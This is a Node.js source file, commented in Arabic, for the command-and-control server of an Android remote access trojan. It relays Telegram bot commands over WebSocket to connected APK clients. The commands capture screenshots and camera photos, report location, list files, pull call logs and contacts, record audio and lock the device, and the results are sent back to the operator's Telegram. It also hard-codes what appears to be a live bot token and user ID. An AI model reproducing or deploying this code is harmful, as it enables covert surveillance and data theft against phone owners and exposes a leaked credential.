const express = require('express');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const http = require('http');

// ⚡ الإعدادات - ضع بياناتك هنا مباشرة
const config = {
    // 🔧 غير هذه القيم حسب بياناتك:
    TELEGRAM_TOKEN: "8330048649:AAFYzP0EvuJTYm__yo4AROYvIt3fy-HDGXY", // ضع توكن البوت هنا
    AUTHORIZED_USERS: [7604667042], // ضع أيدي التلجرام الخاص بك هنا
    SERVER_PORT: process.env.PORT || 3000,
    SERVER_HOST: "0.0.0.0"
};

// 🚨 تحذير إذا لم تغير البيانات
if (config.TELEGRAM_TOKEN === "1234567890:ABCdefGHIjklMNopQRstUVwxYZ123456789") {
    console.log("❌ يرجى تغيير التوكن في السطر 10");
    process.exit(1);
}

if (config.AUTHORIZED_USERS[0] === 123456789) {
    console.log("❌ يرجى تغيير أيدي التلجرام في السطر 11");
    process.exit(1);
}

// إنشاء التطبيقات
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const bot = new TelegramBot(config.TELEGRAM_TOKEN, { polling: true });

// ⚡ تخزين البيانات
const connectedDevices = new Map();
const userSessions = new Map();

// 🌐 وسائط Express
app.use(express.json());
app.use(express.static('public'));

// 📊 صفحة المراقبة
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head><title>Remote Control Server</title></head>
            <body style="font-family: Arial, sans-serif; padding: 20px;">
                <h1>🎮 سيرفر التحكم عن بعد</h1>
                <div style="background: #f0f0f0; padding: 15px; border-radius: 10px;">
                    <h3>📱 الأجهزة المتصلة: <span id="count">${connectedDevices.size}</span></h3>
                    <div id="devices"></div>
                </div>
                <script>
                    function updateDevices() {
                        fetch('/api/devices')
                            .then(r => r.json())
                            .then(data => {
                                document.getElementById('count').textContent = data.count;
                                const devicesDiv = document.getElementById('devices');
                                if (data.devices.length > 0) {
                                    devicesDiv.innerHTML = data.devices.map(d => 
                                        '<div style="background: white; margin: 10px 0; padding: 10px; border-radius: 5px;">' +
                                        '📱 ' + d + '</div>'
                                    ).join('');
                                } else {
                                    devicesDiv.innerHTML = '<p>لا توجد أجهزة متصلة</p>';
                                }
                            });
                    }
                    setInterval(updateDevices, 3000);
                    updateDevices();
                </script>
            </body>
        </html>
    `);
});

// 📡 API للأجهزة
app.get('/api/devices', (req, res) => {
    res.json({
        count: connectedDevices.size,
        devices: Array.from(connectedDevices.keys())
    });
});

// 🔌 اتصال WebSocket من APK
wss.on('connection', (ws, req) => {
    const deviceId = generateDeviceId();
    const clientIp = req.socket.remoteAddress;
    
    console.log(`📱 APK متصل: ${deviceId} من ${clientIp}`);
    
    // حفظ الجهاز المتصل
    connectedDevices.set(deviceId, {
        ws: ws,
        ip: clientIp,
        connectedAt: new Date(),
        info: {}
    });

    // ⚡ إرسال رسالة ترحيب للAPK
    ws.send(JSON.stringify({
        type: 'welcome',
        deviceId: deviceId,
        message: 'تم الاتصال بنجاح بالسيرفر',
        timestamp: Date.now(),
        server: 'Render.com'
    }));

    // 📩 استقبال البيانات من APK
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            handleDeviceMessage(deviceId, message);
        } catch (error) {
            console.error('❌ خطأ في معالجة رسالة APK:', error);
        }
    });

    // 📨 إرسال بيانات الاتصال للتلجرام
    broadcastToTelegram(`📱 جهاز جديد متصل:\n- المعرف: ${deviceId}\n- IP: ${clientIp}\n- الوقت: ${new Date().toLocaleString()}`);

    // 🔌 عند انقطاع الاتصال
    ws.on('close', () => {
        console.log(`❌ APK انقطع: ${deviceId}`);
        connectedDevices.delete(deviceId);
        broadcastToTelegram(`❌ جهاز انقطع: ${deviceId}`);
    });

    ws.on('error', (error) => {
        console.error(`❌ خطأ في اتصال ${deviceId}:`, error);
    });
});

// ⚡ معالجة رسائل APK
function handleDeviceMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    console.log(`📩 من ${deviceId}:`, message.type);

    switch (message.type) {
        case 'device_info':
            device.info = message.data;
            broadcastToTelegram(
                `📊 معلومات الجهاز ${deviceId}:\n` +
                `📱 الموديل: ${message.data.model || 'غير معروف'}\n` +
                `🤖 أندرويد: ${message.data.androidVersion || 'غير معروف'}\n` +
                `🔋 البطارية: ${message.data.battery || 'غير معروف'}%`
            );
            break;

        case 'location':
            broadcastToTelegram(
                `📍 موقع الجهاز ${deviceId}:\n` +
                `📌 خط الطول: ${message.data.longitude}\n` +
                `📌 خط العرض: ${message.data.latitude}\n` +
                `🕒 الوقت: ${new Date(message.timestamp).toLocaleString()}`
            );
            break;

        case 'screenshot_result':
            if (message.success) {
                broadcastToTelegram(`✅ تم التقاط لقطة شاشة من ${deviceId}`);
            } else {
                broadcastToTelegram(`❌ فشل في لقطة الشاشة من ${deviceId}`);
            }
            break;

        case 'camera_result':
            if (message.success) {
                broadcastToTelegram(`✅ تم التقاط صورة من الكاميرا ${deviceId}`);
            }
            break;

        case 'file_list':
            const files = message.data.files || [];
            broadcastToTelegram(
                `📁 ملفات الجهاز ${deviceId}:\n` +
                files.slice(0, 10).map(f => `📄 ${f}`).join('\n') +
                (files.length > 10 ? `\n... و ${files.length - 10} ملفات أخرى` : '')
            );
            break;

        case 'call_logs':
            const calls = message.data.calls || [];
            broadcastToTelegram(
                `📞 سجل المكالمات ${deviceId}:\n` +
                calls.slice(0, 10).map(c => `📞 ${c.number} - ${c.duration}`).join('\n')
            );
            break;

        case 'contacts':
            const contacts = message.data.contacts || [];
            broadcastToTelegram(
                `👥 جهات الاتصال ${deviceId}:\n` +
                contacts.slice(0, 10).map(c => `👤 ${c.name}: ${c.number}`).join('\n') +
                (contacts.length > 10 ? `\n... و ${contacts.length - 10} جهة اتصال` : '')
            );
            break;

        default:
            console.log('📨 رسالة غير معروفة:', message);
    }
}

// 🤖 أوامر التلجرام
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!config.AUTHORIZED_USERS.includes(chatId)) {
        return bot.sendMessage(chatId, '❌ غير مصرح لك بالوصول لهذا البوت');
    }

    userSessions.set(chatId, { activeDevice: null });

    bot.sendMessage(chatId, 
        `🎮 **أدوات التحكم بالأجهزة**

📊 /status - حالة السيرفر والأجهزة
📋 /devices - قائمة الأجهزة المتصلة
🖼️ /screen - لقطة شاشة من الجهاز
📍 /location - موقع الجهاز
📁 /files - استعراض ملفات الجهاز
📷 /camera - صورة من الكاميرا
📞 /calls - سجل المكالمات
👥 /contacts - جهات الاتصال
🎤 /record - تسجيل صوت
🔒 /lock - قفل الجهاز

⚡ الاستخدام: /command deviceId
مثال: /screen device_abc123
        `,
        { parse_mode: 'Markdown' }
    );
});

// 📊 حالة السيرفر
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    bot.sendMessage(chatId,
        `📊 **حالة السيرفر**
        
🖥️ السيرفر: ✅ نشط
📱 الأجهزة: ${connectedDevices.size} متصل
⏰ التشغيل: ${formatUptime(process.uptime())}
💾 الذاكرة: ${Math.round(process.memoryUsage().rss / 1024 / 1024)}MB
🔐 المستخدمون: ${config.AUTHORIZED_USERS.length}
        `,
        { parse_mode: 'Markdown' }
    );
});

// 📋 قائمة الأجهزة
bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    if (connectedDevices.size === 0) {
        return bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة');
    }

    let devicesList = '📱 **الأجهزة المتصلة:**\n\n';
    connectedDevices.forEach((device, deviceId) => {
        devicesList += `🔹 ${deviceId}\n`;
        devicesList += `   📍 IP: ${device.ip}\n`;
        devicesList += `   ⏰ متصل منذ: ${formatTimeDiff(device.connectedAt)}\n\n`;
    });

    bot.sendMessage(chatId, devicesList, { parse_mode: 'Markdown' });
});

// 🖼️ لقطة شاشة
bot.onText(/\/screen (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const deviceId = match[1].trim();
    sendToDevice(deviceId, {
        type: 'take_screenshot',
        quality: 80,
        replyTo: chatId
    });

    bot.sendMessage(chatId, `📸 جاري أخذ لقطة شاشة من ${deviceId}...`);
});

// 📍 الموقع
bot.onText(/\/location (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const deviceId = match[1].trim();
    sendToDevice(deviceId, {
        type: 'get_location',
        replyTo: chatId
    });

    bot.sendMessage(chatId, `📍 جاري الحصول على موقع ${deviceId}...`);
});

// 📁 الملفات
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const deviceId = match[1].trim();
    sendToDevice(deviceId, {
        type: 'list_files',
        path: '/sdcard/',
        replyTo: chatId
    });

    bot.sendMessage(chatId, `📁 جاري استعراض ملفات ${deviceId}...`);
});

// 📷 الكاميرا
bot.onText(/\/camera (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const deviceId = match[1].trim();
    sendToDevice(deviceId, {
        type: 'take_camera_photo',
        camera: 'back',
        replyTo: chatId
    });

    bot.sendMessage(chatId, `📷 جاري التقاط صورة من ${deviceId}...`);
});

// 📞 سجل المكالمات
bot.onText(/\/calls (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const deviceId = match[1].trim();
    sendToDevice(deviceId, {
        type: 'get_call_logs',
        replyTo: chatId
    });

    bot.sendMessage(chatId, `📞 جاري جلب سجل المكالمات من ${deviceId}...`);
});

// 👥 جهات الاتصال
bot.onText(/\/contacts (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const deviceId = match[1].trim();
    sendToDevice(deviceId, {
        type: 'get_contacts',
        replyTo: chatId
    });

    bot.sendMessage(chatId, `👥 جاري جلب جهات الاتصال من ${deviceId}...`);
});

// 🎤 التسجيل
bot.onText(/\/record (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const deviceId = match[1].trim();
    sendToDevice(deviceId, {
        type: 'record_audio',
        duration: 10000,
        replyTo: chatId
    });

    bot.sendMessage(chatId, `🎤 جاري التسجيل من ${deviceId}...`);
});

// 🔒 قفل الجهاز
bot.onText(/\/lock (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!config.AUTHORIZED_USERS.includes(chatId)) return;

    const deviceId = match[1].trim();
    sendToDevice(deviceId, {
        type: 'lock_device',
        replyTo: chatId
    });

    bot.sendMessage(chatId, `🔒 جاري قفل الجهاز ${deviceId}...`);
});

// ⚡ إرسال أمر لجهاز معين
function sendToDevice(deviceId, command) {
    const device = connectedDevices.get(deviceId);
    if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
        const chatId = command.replyTo;
        if (chatId) {
            bot.sendMessage(chatId, `❌ الجهاز ${deviceId} غير متصل`);
        }
        return false;
    }

    device.ws.send(JSON.stringify(command));
    return true;
}

// 📨 إرسال رسالة لجميع المستخدمين المصرح لهم
function broadcastToTelegram(message) {
    config.AUTHORIZED_USERS.forEach(userId => {
        bot.sendMessage(userId, message).catch(err => {
            console.error('❌ فشل إرسال للتلجرام:', err);
        });
    });
}

// 🛠️ وظائف مساعدة
function generateDeviceId() {
    return 'device_' + Math.random().toString(36).substring(2, 8);
}

function formatUptime(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    return `${hours} ساعة, ${minutes} دقيقة`;
}

function formatTimeDiff(date) {
    const diff = Date.now() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    if (minutes < 60) return `${minutes} دقيقة`;
    const hours = Math.floor(minutes / 60);
    return `${hours} ساعة`;
}

// 🚀 بدء السيرفر
server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
    console.log(`🎯 سيرفر التحكم يعمل على: http://${config.SERVER_HOST}:${config.SERVER_PORT}`);
    console.log(`🤖 بوت التلجرام جاهز للاستخدام`);
    console.log(`📱 متوافق مع APK عبر WebSocket`);
    console.log(`🔐 المستخدمون المصرح لهم: ${config.AUTHORIZED_USERS.join(', ')}`);
});

// 🛡️ معالجة الأخطاء
process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ وعد مرفوض:', reason);
});
